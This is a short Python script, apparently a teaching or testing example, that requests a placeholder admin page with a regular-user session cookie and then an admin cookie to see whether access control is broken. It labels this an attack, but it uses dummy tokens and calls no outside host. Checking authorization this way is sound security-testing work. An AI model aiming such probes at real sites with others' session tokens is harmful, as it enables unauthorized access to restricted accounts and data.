import requests

# Target URL and endpoints
TARGET_URL = 'http://vulnerable-website.com/admin'
USER_SESSION_COOKIE = 'user_session_token'
ADMIN_SESSION_COOKIE = 'admin_session_token'

def access_restricted_resource(url, session_cookie):
    # Attempt to access a restricted resource with different session cookies
    response = requests.get(url, cookies={'session': session_cookie})
    return response

def perform_access_control_attack():
    # Attempt to access admin endpoint with regular user session
    user_response = access_restricted_resource(TARGET_URL, USER_SESSION_COOKIE)
    print("Attempt with regular user session:")
    print(user_response.text)
    
    # Attempt to access admin endpoint with admin session
    admin_response = access_restricted_resource(TARGET_URL, ADMIN_SESSION_COOKIE)
    print("Attempt with admin session:")
    print(admin_response.text)

perform_access_control_attack()
